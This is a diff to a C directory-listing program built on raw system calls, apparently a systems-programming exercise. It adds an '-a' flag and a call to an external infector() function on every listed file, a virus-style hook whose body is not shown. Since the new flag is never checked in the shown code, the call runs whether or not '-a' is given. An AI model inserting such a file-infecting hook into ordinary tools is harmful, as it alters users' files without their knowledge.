@@ -18,7 +18,7 @@
 
 
 extern int system_call();
-
+extern void infector();
 typedef struct ent
 {
     int inode;    /* Inode number */
@@ -73,7 +73,7 @@ void typePrinter(int c)
 
 int main(int argc, char *argv[])
 {
-    int pmode = 0 , i;
+    int pmode = 0 ,amode = 0, i;
     char *prefix;
     for (i = 1; i < argc; i++)
     {
@@ -81,6 +81,11 @@ int main(int argc, char *argv[])
         {
             pmode = 1;
             prefix = argv[i] + 2;
+        }
+        else if (!strncmp(argv[i], "-a", 2))
+        {
+            amode = 1;
+    
         }
         else
         {
@@ -106,7 +111,8 @@ int main(int argc, char *argv[])
             continue;
         }
         if (!pmode || (pmode && !strncmp(ptr->name, prefix, 1)))
-        {
+        {   
+            infector(ptr->name);
             system_call(SYS_WRITE, STDOUT, ptr->name, strlen(ptr->name) + 2);
             system_call(SYS_WRITE, STDOUT, "\t\t", 3);
             if (pmode)
